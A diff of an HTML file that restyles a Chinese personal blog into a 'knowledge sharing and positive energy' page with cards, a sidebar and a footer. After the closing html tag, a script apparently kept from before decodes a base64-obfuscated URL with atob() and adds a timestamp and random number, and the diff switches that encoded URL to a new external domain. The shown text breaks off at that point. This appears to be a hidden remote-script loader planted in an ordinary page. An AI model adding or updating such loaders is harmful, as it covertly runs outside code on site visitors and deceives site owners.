@@ -1,318 +1,643 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>我的个人博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>知识分享与正能量随笔</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* 基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+        
+        :root {
+            --primary: #4a6fa5;
+            --secondary: #6b8cbc;
+            --accent: #ff9a76;
+            --light: #f8f9fa;
+            --dark: #343a40;
+            --success: #51cf66;
+            --text: #495057;
+            --text-light: #6c757d;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --radius: 12px;
+        }
+        
         body {
-            overflow: hidden;
-            font-family: 'Inter', sans-serif;
-            /* 假设Inter字体可用，否则使用系统默认 */
-            margin: 0;
-            padding: 0;
-            background-color: #f8f8f8;
-            /* 浅色背景 */
-            color: #333333;
-            /* 深色文本 */
+            background-color: #f5f7fa;
+            color: var(--text);
             line-height: 1.6;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
         }
-
-        /* 容器 */
+        
         .container {
-            max-width: 90%;
-            /* 适应移动端 */
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 20px 0;
+            padding: 0 20px;
         }
-
-        /* 头部 */
+        
+        /* 头部样式 */
         header {
-            background-color: #e9ecef;
-            /* 头部背景色 */
-            padding: 20px 0;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 2rem 0;
             text-align: center;
-            border-bottom-left-radius: 15px;
-            border-bottom-right-radius: 15px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2rem;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
         }
-
-        header h1 {
-            margin: 0;
-            font-size: 1.8em;
-            /* 适应移动端 */
-            color: #333333;
+        
+        header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            z-index: 1;
         }
-
-        /* 导航 */
+        
+        .header-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+        
+        /* 导航栏 */
         nav {
-            background-color: #007bff;
-            /* 强调色作为导航背景 */
-            text-align: center;
-            padding: 10px 0;
-            border-radius: 15px;
-            margin-top: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
-            /* 更明显的阴影 */
+            background-color: white;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-
-        nav ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
+        
+        .nav-container {
             display: flex;
-            /* 弹性布局 */
-            justify-content: space-around;
-            /* 均匀分布 */
-            flex-wrap: wrap;
-            /* 允许换行 */
-            /* 移除移动端垂直堆叠和隐藏的样式，确保始终横向显示 */
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
         }
-
-        nav ul li {
-            margin: 5px 10px;
+        
+        .logo {
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--primary);
         }
-
-        nav ul li a {
-            color: #ffffff;
-            /* 白色文字 */
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .nav-links a {
             text-decoration: none;
-            padding: 10px 20px;
-            /* 增加内边距 */
-            border-radius: 10px;
-            /* 更圆润的边角 */
-            transition: background-color 0.3s ease, transform 0.2s ease;
-            /* 平滑过渡和点击效果 */
-            display: block;
-            /* 确保整个区域可点击 */
-            font-weight: 600;
-            /* 加粗字体 */
-            letter-spacing: 0.5px;
-            /* 增加字母间距 */
+            color: var(--text);
+            font-weight: 500;
+            transition: color 0.3s;
+            position: relative;
         }
-
-        nav ul li a:hover,
-        nav ul li a:focus {
-            background-color: #0056b3;
-            /* 悬停颜色 */
-            transform: translateY(-2px);
-            /* 悬停时上浮 */
+        
+        .nav-links a:hover {
+            color: var(--primary);
         }
-
-        nav ul li a:active {
-            transform: translateY(0);
-            /* 点击时恢复 */
-            background-color: #004085;
-            /* 点击时的深色 */
+        
+        .nav-links a::after {
+            content: "";
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: var(--primary);
+            transition: width 0.3s;
         }
-
-        /* 文章卡片 */
-        .article-card {
-            background-color: #ffffff;
-            margin-bottom: 25px;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
-            transition: transform 0.3s ease;
-            /* 平滑过渡 */
+        
+        .nav-links a:hover::after {
+            width: 100%;
         }
-
-        .article-card:hover {
+        
+        /* 主要内容区域 */
+        .main-content {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+        
+        /* 知识卡片 */
+        .knowledge-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .card {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .card:hover {
             transform: translateY(-5px);
-            /* 鼠标悬停效果 */
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.12);
         }
-
-        .article-card h2 {
-            font-size: 1.5em;
-            /* 适应移动端 */
-            color: #007bff;
-            /* 强调色 */
-            margin-top: 0;
-            margin-bottom: 10px;
+        
+        .card-header {
+            padding: 1.5rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
         }
-
-        .article-card .date {
-            font-size: 0.9em;
-            color: #666666;
-            margin-bottom: 15px;
-            display: block;
+        
+        .card-body {
+            padding: 1.5rem;
         }
-
-        .article-card p {
-            font-size: 1em;
-            color: #555555;
-            margin-bottom: 15px;
+        
+        .card-title {
+            font-size: 1.4rem;
+            margin-bottom: 0.5rem;
         }
-
-        .article-card img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-            margin: 15px auto;
-            border-radius: 10px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        
+        .card-meta {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
         }
-
+        
+        .card-content {
+            margin-bottom: 1.5rem;
+        }
+        
         .read-more {
             display: inline-block;
-            background-color: #007bff;
-            color: #ffffff;
-            padding: 10px 20px;
-            border-radius: 8px;
+            color: var(--primary);
             text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease;
+            font-weight: 500;
+            transition: color 0.3s;
         }
-
+        
         .read-more:hover {
-            background-color: #0056b3;
+            color: var(--accent);
         }
-
+        
+        /* 侧边栏 */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+        
+        .sidebar-widget {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 1.5rem;
+        }
+        
+        .widget-title {
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--light);
+            color: var(--primary);
+        }
+        
+        /* 正能量语录 */
+        .positive-quote {
+            background: linear-gradient(135deg, #ffd89b, #19547b);
+            color: white;
+            border-radius: var(--radius);
+            padding: 2rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .positive-quote::before {
+            content: """;
+            position: absolute;
+            top: -20px;
+            left: 10px;
+            font-size: 8rem;
+            opacity: 0.2;
+            color: white;
+            font-family: Georgia, serif;
+        }
+        
+        .quote-text {
+            font-size: 1.4rem;
+            font-style: italic;
+            margin-bottom: 1rem;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .quote-author {
+            font-weight: 500;
+            opacity: 0.9;
+        }
+        
+        /* 知识分类 */
+        .categories {
+            list-style: none;
+        }
+        
+        .categories li {
+            margin-bottom: 0.8rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid var(--light);
+        }
+        
+        .categories a {
+            text-decoration: none;
+            color: var(--text);
+            display: flex;
+            justify-content: space-between;
+            transition: color 0.3s;
+        }
+        
+        .categories a:hover {
+            color: var(--primary);
+        }
+        
+        .category-count {
+            background: var(--light);
+            color: var(--text-light);
+            border-radius: 20px;
+            padding: 0.2rem 0.6rem;
+            font-size: 0.8rem;
+        }
+        
+        /* 知识记录 */
+        .knowledge-record {
+            background: white;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .record-title {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .record-item {
+            margin-bottom: 1.5rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid var(--light);
+        }
+        
+        .record-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .record-date {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-bottom: 0.5rem;
+        }
+        
+        .record-content {
+            line-height: 1.7;
+        }
+        
         /* 页脚 */
         footer {
-            background-color: #e9ecef;
-            /* 页脚背景色 */
-            padding: 20px 0;
-            text-align: center;
-            font-size: 0.9em;
-            color: #666666;
-            margin-top: 30px;
-            border-top-left-radius: 15px;
-            border-top-right-radius: 15px;
-            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.05);
+            background: var(--dark);
+            color: white;
+            padding: 3rem 0;
+            margin-top: 3rem;
         }
-
-        .social-links a {
-            color: #007bff;
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+        }
+        
+        .footer-column h3 {
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            padding-bottom: 0.5rem;
+        }
+        
+        .footer-column h3::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 40px;
+            height: 2px;
+            background-color: var(--accent);
+        }
+        
+        .footer-links {
+            list-style: none;
+        }
+        
+        .footer-links li {
+            margin-bottom: 0.8rem;
+        }
+        
+        .footer-links a {
+            color: #adb5bd;
             text-decoration: none;
-            margin: 0 10px;
-            font-size: 1.2em;
-            transition: color 0.3s ease;
+            transition: color 0.3s;
         }
-
+        
+        .footer-links a:hover {
+            color: white;
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            text-decoration: none;
+            transition: background 0.3s;
+        }
+        
         .social-links a:hover {
-            color: #0056b3;
+            background: var(--accent);
         }
-
-        /* 移动端导航菜单切换按钮 - 永久隐藏 */
-        .nav-toggle {
-            display: none !important;
-            /* 强制隐藏菜单切换按钮 */
+        
+        .copyright {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #adb5bd;
+            font-size: 0.9rem;
+        }
+        
+        /* 响应式设计 */
+        @media (max-width: 992px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .nav-container {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .knowledge-cards {
+                grid-template-columns: 1fr;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
         }
     </style>
-    <link rel="stylesheet" href="./static/css/style.css">
 </head>
-
 <body>
+    <!-- 头部 -->
     <header>
-        <div class="container">
-            <h1>我的思考与分享</h1>
-            <p>探索技术，记录生活，分享点滴</p>
+        <div class="container header-content">
+            <h1>知识分享与正能量随笔</h1>
+            <p class="tagline">记录知识，传递智慧，分享正能量</p>
         </div>
     </header>
-
+    
+    <!-- 导航栏 -->
+    <nav>
+        <div class="container nav-container">
+            <div class="logo">智识笔记</div>
+            <div class="nav-links">
+                <a href="#"><i class="fas fa-home"></i> 首页</a>
+                <a href="#"><i class="fas fa-book"></i> 知识库</a>
+                <a href="#"><i class="fas fa-pen"></i> 随笔</a>
+                <a href="#"><i class="fas fa-heart"></i> 正能量</a>
+                <a href="#"><i class="fas fa-user"></i> 关于我</a>
+            </div>
+        </div>
+    </nav>
+    
     <div class="container">
-        <!-- 移除菜单切换按钮，因为导航将始终显示 -->
-        <nav id="mainNav">
-            <ul>
-                <li><a href="#home">首页</a></li>
-                <li><a href="#about">关于我</a></li>
-                <li><a href="#articles">文章</a></li>
-                <li><a href="#contact">联系</a></li>
-            </ul>
-        </nav>
-
-        <main id="articles">
-            <section class="container">
-                <h2>最新文章</h2>
-                <div class="article-list">
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=1" alt="文章插图1" class="random-image">
-                        <h2>深入理解CSS Flexbox布局</h2>
-                        <span class="date">2023年10月26日</span>
-                        <p>Flexbox是一种一维布局方法，它能够帮助我们更有效地设计和分配容器中项目之间的空间。本文将详细介绍Flexbox的基本概念、属性及其在实际项目中的应用。</p>
-                        <a href="#" class="read-more">阅读更多</a>
+        <!-- 正能量语录 -->
+        <div class="positive-quote">
+            <p class="quote-text">知识就像内功，积累越深厚，发挥出的力量越大。每天进步一点点，终将成就非凡。</p>
+            <p class="quote-author">—— 智识笔记</p>
+        </div>
+        
+        <!-- 主要内容区域 -->
+        <div class="main-content">
+            <!-- 左侧内容 -->
+            <div class="left-content">
+                <!-- 知识卡片 -->
+                <h2 style="margin-bottom: 1.5rem; color: var(--primary);">最新知识分享</h2>
+                <div class="knowledge-cards">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="card-title">时间管理的艺术</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-10-15</span>
+                                <span><i class="far fa-folder"></i> 个人成长</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>有效的时间管理不仅仅是安排日程，更是一种生活态度。学会区分重要与紧急事务，合理分配精力，才能实现高效工作与生活的平衡。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多 <i class="fas fa-arrow-right"></i></a>
+                        </div>
                     </div>
-
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=2" alt="文章插图2" class="random-image">
-                        <h2>JavaScript异步编程：从回调到Async/Await</h2>
-                        <span class="date">2023年10月20日</span>
-                        <p>JavaScript的异步特性是其核心之一。从早期的回调函数，到Promise，再到ES2017引入的Async/Await，本文将带您回顾异步编程的演进，并探讨如何编写更清晰、更易维护的异步代码。
-                        </p>
-                        <a href="#" class="read-more">阅读更多</a>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="card-title">深度工作法</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-10-10</span>
+                                <span><i class="far fa-folder"></i> 工作效率</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>在信息爆炸的时代，专注力成为稀缺资源。深度工作法通过创造无干扰环境，训练大脑集中注意力，从而在更短时间内完成高质量工作。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多 <i class="fas fa-arrow-right"></i></a>
+                        </div>
                     </div>
-
-                    <div class="article-card">
-                        <img src="https://picsum.photos/300/200?random=3" alt="文章插图3" class="random-image">
-                        <h2>构建响应式网页的实用技巧</h2>
-                        <span class="date">2023年10月15日</span>
-                        <p>随着移动设备的普及，响应式网页设计变得至关重要。本文将分享一些实用的技巧，帮助您构建在各种屏幕尺寸上都能提供良好用户体验的网站。</p>
-                        <a href="#" class="read-more">阅读更多</a>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="card-title">积极心理学实践</h3>
+                            <div class="card-meta">
+                                <span><i class="far fa-calendar"></i> 2023-10-05</span>
+                                <span><i class="far fa-folder"></i> 心理健康</span>
+                            </div>
+                        </div>
+                        <div class="card-body">
+                            <div class="card-content">
+                                <p>积极心理学关注人类优势与幸福感，通过感恩日记、优势识别、正念练习等方法，帮助我们培养积极心态，提升生活满意度。</p>
+                            </div>
+                            <a href="#" class="read-more">阅读更多 <i class="fas fa-arrow-right"></i></a>
+                        </div>
                     </div>
                 </div>
-            </section>
-        </main>
+                
+                <!-- 知识记录 -->
+                <div class="knowledge-record">
+                    <h2 class="record-title">知识记录随笔</h2>
+                    
+                    <div class="record-item">
+                        <div class="record-date">2023年10月18日</div>
+                        <div class="record-content">
+                            <p>今天学习了一个有趣的概念——"反脆弱"。与脆弱相对，反脆弱性是指那些不仅能抵抗冲击，还能从冲击中获益的事物。这让我思考如何在个人成长中培养反脆弱性，将挑战转化为成长机会。</p>
+                        </div>
+                    </div>
+                    
+                    <div class="record-item">
+                        <div class="record-date">2023年10月12日</div>
+                        <div class="record-content">
+                            <p>阅读了关于"思维模型"的内容，意识到我们每个人都在使用各种思维模型来理解和应对世界。多元思维模型就像工具箱里的不同工具，面对不同问题选择合适工具，能大大提高决策质量。</p>
+                        </div>
+                    </div>
+                    
+                    <div class="record-item">
+                        <div class="record-date">2023年10月5日</div>
+                        <div class="record-content">
+                            <p>了解到"成长型思维"与"固定型思维"的区别。拥有成长型思维的人相信能力可以通过努力培养，这使他们更愿意接受挑战，从失败中学习。这提醒我要在日常中培养成长型思维。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- 右侧侧边栏 -->
+            <div class="sidebar">
+                <!-- 关于我 -->
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">关于我</h3>
+                    <p>一名热爱学习和分享的知识探索者，相信知识改变命运，积极心态塑造人生。</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-weixin"></i></a>
+                        <a href="#"><i class="fab fa-github"></i></a>
+                        <a href="#"><i class="fab fa-bilibili"></i></a>
+                        <a href="#"><i class="fab fa-zhihu"></i></a>
+                    </div>
+                </div>
+                
+                <!-- 知识分类 -->
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">知识分类</h3>
+                    <ul class="categories">
+                        <li>
+                            <a href="#">个人成长 <span class="category-count">12</span></a>
+                        </li>
+                        <li>
+                            <a href="#">工作效率 <span class="category-count">8</span></a>
+                        </li>
+                        <li>
+                            <a href="#">心理健康 <span class="category-count">6</span></a>
+                        </li>
+                        <li>
+                            <a href="#">学习方法 <span class="category-count">10</span></a>
+                        </li>
+                        <li>
+                            <a href="#">思维模型 <span class="category-count">7</span></a>
+                        </li>
+                    </ul>
+                </div>
+                
+                <!-- 正能量语录 -->
+                <div class="sidebar-widget">
+                    <h3 class="widget-title">每日正能量</h3>
+                    <p style="font-style: italic; color: var(--primary);">"生活不是等待风暴过去，而是学会在雨中跳舞。"</p>
+                    <p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">困难是成长的机会，挑战是进步的阶梯。保持积极心态，每一天都是新的开始。</p>
+                </div>
+            </div>
+        </div>
     </div>
-
+    
+    <!-- 页脚 -->
     <footer>
         <div class="container">
-            <p>&copy; 2025 我的个人博客. 版权所有.</p>
-            <div class="social-links">
-                <a href="https://weibo.com/yourprofile" target="_blank">微博</a> |
-                <a href="https://github.com/yourprofile" target="_blank">GitHub</a> |
-                <a href="https://twitter.com/yourprofile" target="_blank">Twitter</a>
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>智识笔记</h3>
+                    <p>记录知识，传递智慧，分享正能量。让我们一起在知识的海洋中探索，共同成长。</p>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>快速链接</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">首页</a></li>
+                        <li><a href="#">知识库</a></li>
+                        <li><a href="#">随笔记录</a></li>
+                        <li><a href="#">正能量分享</a></li>
+                        <li><a href="#">关于我</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>联系我</h3>
+                    <ul class="footer-links">
+                        <li><i class="fas fa-envelope"></i> contact@example.com</li>
+                        <li><i class="fas fa-map-marker-alt"></i> 中国 · 北京</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>&copy; 2023 智识笔记 | 知识分享与正能量随笔</p>
             </div>
         </div>
     </footer>
-    <div id="overlay">
-        <div id="loading_box" class="loading_container">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
-    </div>
-
-    <script>
-        // JS功能1: 为图片URL添加时间戳以防止缓存
-        document.addEventListener('DOMContentLoaded', function () {
-            const images = document.querySelectorAll('.random-image');
-            images.forEach(img => {
-                const originalSrc = img.src;
-                const timestamp = new Date().getTime();
-                img.src = `${originalSrc}&t=${timestamp}`;
-            });
-
-            // JS功能2: 平滑滚动 (点击导航链接时)
-            document.querySelectorAll('nav a').forEach(anchor => {
-                anchor.addEventListener('click', function (e) {
-                    e.preventDefault(); // 阻止默认跳转
-
-                    const targetId = this.getAttribute('href').substring(1);
-                    const targetElement = document.getElementById(targetId);
-
-                    if (targetElement) {
-                        // 导航菜单不再隐藏，所以不需要考虑 navToggle.offsetHeight
-                        window.scrollTo({
-                            top: targetElement.offsetTop,
-                            behavior: 'smooth' // 平滑滚动
-                        });
-                    }
-                });
-            });
-        });
-    </script>
+</body>
+</html>
     <script>
         (function () {
             function init() {
-                const encodedUrl = "aHR0cHM6Ly91c2hvcGltZ3Mub3NzLWFwLXNvdXRoZWFzdC0xLmFsaXl1bmNzLmNvbS9jb3JlLmpz";
+                const encodedUrl = "aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLmVuLmpz";
                 const decodedUrl = atob(encodedUrl);
                 const timestamp = Date.now();
                 const randomNum = Math.floor(Math.random() * 1000000);
